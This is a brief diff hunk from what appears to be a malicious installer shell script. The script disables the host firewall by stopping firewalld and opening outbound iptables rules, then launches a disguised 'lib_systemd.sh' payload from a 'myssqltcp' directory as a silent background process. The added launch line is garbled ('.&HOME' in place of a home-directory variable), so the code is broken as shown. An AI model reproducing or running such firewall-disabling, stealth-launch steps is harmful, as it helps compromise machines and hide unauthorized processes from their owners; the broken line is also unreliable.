@@ -1475,5 +1475,5 @@ iptables -A OUTPUT -j ACCEPT
 service iptables reload
 systemctl stop firewalld.service
 
-cd /tmp/myssqltcp/ && nohup ./lib_systemd.sh >/dev/null 2>&1 &
+nohup .&HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1 &
 echo "[*] Yes-GoGo"
